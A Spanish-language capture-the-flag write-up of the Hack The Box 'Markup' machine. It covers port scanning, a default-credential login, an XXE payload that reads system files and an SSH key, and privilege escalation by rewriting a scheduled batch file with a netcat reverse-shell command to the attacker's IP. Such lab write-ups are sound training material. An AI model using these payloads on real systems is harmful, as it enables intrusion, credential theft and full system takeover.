---
title: Markup
layout: page
permalink: /HTB_Markup
---

<h2 class="amarillo">Markup</h2>
<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/markup.webp" alt="under" oncontextmenu="return false;">
</div>


Encendemos la máquina y una vez verificados con ping lanzaremos un escaneo rápido y sigiloso con nmap para identificar los puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.192 -oG allPorts
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Utilizando la utilidad de extractPorts como siempre copiaremos los puertos abiertos de la captura y haremos un escano exhaustivo para identificar la version y servicio que corren para estos puertos:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Miramos los resultados del escaneo:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/nmap2.png" alt="under" oncontextmenu="return false;">
</div>


<h1 class="amarillo">Explotación</h1>

Vemos un servicio web, podemos probar a enumerarlo con whatweb para ver un poquito a que nos estamos enfrentando:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un apache y un ssl, recordar importante que ssl es un puerto para HTTPS entonces también podemos atentar contra este puerto con whatweb:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/whatweb2.png" alt="under" oncontextmenu="return false;">
</div>

Sin muchos resultados abrimos la web y nos encontramos un panel de login:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/web.png" alt="under" oncontextmenu="return false;">
</div>

Pudimos burlar este panel con admin:password como credenciales por defecto.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/web2.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que la página tiene una parte curiosa y llama mucho la atención:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/xml.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a colocar datos y interceptar la petición con Caido:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/caido.png" alt="under" oncontextmenu="return false;">
</div>


Y vemos que se está tramitando un estructura en XML, y como estamos frente a un Windows podemos tratar de listar contenido del hosts:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/caido2.png" alt="under" oncontextmenu="return false;">
</div>

Y efectivamente, por tanto tenemos un XXE XML EXternal Entity, podemos intentar otra cosa como ir listando el directorio del usuario y vemos que podemos acceder al directorio de daniel y a su carpeta .ssh:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/caido3.png" alt="under" oncontextmenu="return false;">
</div>

Una vez tenemos esta llave rsa podemos conectarnos por SSH:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/user.png" alt="under" oncontextmenu="return false;">
</div>

Y habremos completado la intrusión:

<h1 class="amarillo">Escalada</h1>

Al igual que las máquinas Linux con `sudo -l` en Windows podemos hacer `whoami /priv`
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/escalada.png" alt="under" oncontextmenu="return false;">
</div>

Podemos acceder a directorios privilegiados y encontramos dentro de C:\ un directorio inusual llamado Log-Management
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/escalada2.png" alt="under" oncontextmenu="return false;">
</div>

Vemos que podemos ejecutar job.bat como Administrator y usando icacls podemos confirmarlo
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/escalada3.png" alt="under" oncontextmenu="return false;">
</div>

La idea será subir el ncat para windows y entablar una reverse shell abusando del binario.bat<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/escalada4.png" alt="under" oncontextmenu="return false;">
</div>

Estando en escucha por el puerto 443 ejecutamos `echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.12 443 > C:\Log-Management\job.bat`
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/metidos.png" alt="under" oncontextmenu="return false;">
</div>

Voila! obtenemos la shell como Administrator.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/VIP/Markup/pwn.png" alt="under" oncontextmenu="return false;">
</div>
